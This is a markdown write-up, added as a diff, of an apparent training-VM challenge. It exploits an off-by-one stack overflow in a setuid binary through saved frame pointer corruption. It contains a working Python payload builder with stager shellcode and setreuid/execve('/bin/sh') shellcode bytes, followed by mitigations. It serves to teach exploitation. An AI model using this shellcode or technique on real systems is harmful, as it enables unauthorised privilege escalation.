@@ -1,0 +1,181 @@
+# Dixie — Off-by-One Stack Overflow to Privilege Escalation
+
+**Binary:** `./dixie` (setuid, owned by `flag02:level02`, mode `4750`)
+**Goal:** local privilege escalation from `level02` to `flag02`
+
+## 1. Recon
+
+```
+-rwsr-x--- 1 flag02 level02 16512 Jun  9 23:13 ./dixie
+```
+
+The setuid bit plus group ownership tells us the whole story: if we can hijack
+control flow inside `dixie`, we execute as `flag02`. The `file` output shows a
+dynamically linked, non-stripped x86-64 ELF, which makes disassembly/symbol
+names easy to work with.
+
+## 2. The bug
+
+`store_record()` reads into a 64-byte stack buffer with this loop:
+
+```c
+char buf[BUF_SIZE];        /* BUF_SIZE == 64 */
+in_len = 0;
+while (in_len <= BUF_SIZE) {          /* <= instead of < */
+    in_ch = read(0, &buf[in_len], 1);
+    if (in_ch <= 0) break;
+    in_len++;
+}
+```
+
+The condition `in_len <= BUF_SIZE` allows one extra iteration: when
+`in_len == 64`, the loop still executes and writes to `buf[64]` — one byte
+past the end of a 64-byte array. This is a classic **off-by-one** overflow.
+
+Because `buf` is the *only* local variable in `store_record` (the counters
+live at file scope), the compiler places it directly below the saved frame
+pointer with no padding:
+
+```
+[ buf[0] .. buf[63] ] [ saved RBP (8 bytes) ] [ return address (8 bytes) ]
+      ^ writable            ^ buf[64] lands
+                              on the low byte
+```
+
+So the one stray byte we can write doesn't hit the return address — it
+overwrites the **least significant byte of `store_record`'s saved RBP**.
+
+## 3. Turning a 1-byte overwrite into control flow
+
+A single-byte overwrite of a saved frame pointer is a well-known primitive:
+since the low byte can take any of 256 values, an attacker can nudge the
+restored RBP to point anywhere within roughly one page of its original
+location — in particular, back into their own buffer.
+
+Here's what happens after `store_record` returns:
+
+1. `store_record`'s epilogue (`leave; ret`) restores RBP from the corrupted
+   saved value. That corrupted value is `main`'s original RBP with its low
+   byte forced to `0x28` by our overflow byte.
+2. Execution proceeds normally through `dump_records()` (it saves/restores
+   its own RBP around its own use, so the corruption survives untouched).
+3. When `main()` itself hits `leave; ret`:
+   - `leave` → `mov rsp, rbp` — RSP now points into **our** buffer, at the
+     offset we aimed for with the `0x28` low-byte overwrite.
+   - `pop rbp` — pulls 8 attacker-controlled bytes off the stack.
+   - `ret` — pops the *next* 8 bytes and jumps to them.
+
+That "next 8 bytes" is fully attacker-controlled, because it lives inside
+the very `buf` we filled in `store_record`. In other words, the off-by-one
+RBP corruption tricks `main`'s epilogue into treating part of our input
+buffer as its own stack frame, letting us supply a fake return address.
+
+## 4. Payload #1 — the stager
+
+```python
+shellcode = b"\x31\xC0\x31\xFF\x48\x89\xE6\x6A\x40\x5A\x0F\x05\xFF\xE4"
+exploit  = b"\x90"*(32-len(shellcode)) + shellcode   # 32 bytes: NOP sled + stage-1
+exploit += b"C"*16                                   # 32-47: filler (fake saved RBP, discarded)
+exploit += struct.pack("Q", 0x7fffffffe200)          # 48-55: fake return address
+exploit += b"C"*8                                    # 56-63: padding
+exploit += b"\x28"                                   # 64: overflow byte → RBP low byte
+```
+
+That 14-byte `shellcode` disassembles to:
+
+```
+xor eax, eax
+xor edi, edi
+mov rsi, rsp
+push 0x40
+pop rdx
+syscall          ; read(0, rsp, 0x40)
+jmp rsp
+```
+
+i.e. `read(0, rsp, 64)` followed by `jmp rsp`. This is a minimal **stager**:
+it reads 64 more bytes from stdin directly onto the stack and jumps straight
+into them. It's placed at the tail of a 32-byte NOP sled so that landing
+anywhere in the sled slides execution into it.
+
+The fake return address, `0x7fffffffe200`, is a hard-coded guess/known value
+for where that stack buffer sits (stack address is stable here because
+there's no ASLR / a fixed environment on the target, which is typical for
+this kind of training VM). `main`'s corrupted `leave;ret` jumps straight to
+it, landing in the NOP sled and running the stager.
+
+## 5. Payload #2 — the real shellcode
+
+Sent immediately after payload #1 (consumed by the stager's `read()` call):
+
+```python
+exploit2  = b"1\xfff\xbf\xfb\x03jqXH\x89\xfe\x0f\x05"
+exploit2 += b"\x31\xD2\x52\x48\xB8\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x50\x48\x89\xE7\x31\xF6\x48\x31\xC0\xB0\x3B\x0F\x05"
+```
+
+First chunk decodes to:
+
+```
+xor edi, edi
+mov di, 0x3fb        ; 1019
+mov rax, 0x71         ; syscall 113 = setreuid
+mov rsi, rdi
+syscall                ; setreuid(1019, 1019)
+```
+
+This calls `setreuid()` with `flag02`'s numeric UID (`1019`), setting *both*
+the real and effective UID. This matters because after the exploit, the
+effective UID is already `flag02` (courtesy of the setuid bit) but the real
+UID is still `level02` — and many shells refuse to run with mismatched
+real/effective UIDs for safety, silently dropping privileges. Calling
+`setreuid` first makes the privilege stick.
+
+Second chunk is textbook `execve("/bin/sh", NULL, NULL)`:
+
+```
+xor edx, edx
+push rdx
+movabs rax, 0x68732f2f6e69622f   ; "/bin//sh"
+push rax
+mov rdi, rsp
+xor esi, esi
+xor eax, eax
+mov al, 0x3b       ; syscall 59 = execve
+syscall
+```
+
+## 6. Putting it together
+
+1. Overflow `buf[64]` by one byte via the vulnerable read loop, corrupting
+   the LSB of `store_record`'s saved RBP.
+2. That corruption propagates through to `main`'s RBP, so `main`'s
+   `leave;ret` treats attacker-controlled buffer bytes as its own stack
+   frame — yielding a fake return address instead of the real one.
+3. The fake return address jumps into a NOP sled/stager shellcode sitting
+   on the stack (planted by our own overflowing input).
+4. The stager reads a second payload from stdin and executes it.
+5. The second payload fixes up the real UID with `setreuid`, then
+   `execve`s `/bin/sh` — a root-equivalent (here, `flag02`-equivalent)
+   shell.
+
+## 7. Why this works without a direct return-address overwrite
+
+The interesting part of this challenge is that the overflow is *too small*
+to reach the saved return address directly — it can only touch one byte
+past the buffer. The exploit compensates by abusing the **saved frame
+pointer** instead: corrupting it redirects where the *next* function's
+epilogue thinks its own frame lives, letting the attacker forge a second,
+indirect return address out of otherwise-inert buffer bytes. This
+"off-by-one → frame pointer overwrite → forged epilogue" chain is a classic
+technique for exploiting overflows that are one byte too short to be a
+"normal" stack smash.
+
+## 8. Mitigations that would have stopped this
+
+- **Fix the off-by-one**: `while (in_len < BUF_SIZE)`.
+- **Stack canaries** (`-fstack-protector-all`) would detect the corrupted
+  saved RBP/return path before `leave;ret` executes.
+- **ASLR** on the stack would make the hard-coded `0x7fffffffe200` target
+  address unreliable, defeating the stager jump.
+- **NX/W^X** would prevent jumping into or executing shellcode placed on
+  the stack in the first place.
